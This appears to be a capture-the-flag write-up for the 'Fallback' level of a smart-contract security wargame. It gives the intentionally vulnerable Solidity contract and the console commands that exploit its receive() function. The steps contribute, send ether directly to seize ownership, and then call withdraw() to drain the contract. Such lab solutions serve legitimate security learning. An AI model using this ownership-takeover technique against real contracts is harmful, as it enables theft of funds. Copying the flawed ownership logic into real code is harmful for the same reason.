``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

```javascript
contract.contribute.sendTransaction({value:100000000000000})
Promise {<pending>, _events: i, emit: ƒ, on: ƒ, …}
⛏️ Sent transaction ⛏ 
⛏️ Mined transaction ⛏


contract.sendTransaction({value:10000000000})
Promise {<pending>, _events: i, emit: ƒ, on: ƒ, …}
⛏️ Sent transaction ⛏ 
⛏️ Mined transaction ⛏ 



await contract.owner()
'0x*************************************b8f21'


contract.withdraw()
Promise {<pending>, _events: i, emit: ƒ, on: ƒ, …}
⛏️ Sent transaction ⛏ 
⛏️ Mined transaction ⛏

◕_◕ Submitting level instance... <  < <<PLEASE WAIT>> >  >

龴ↀ◡ↀ龴 Well done, You have completed this level!!!
```
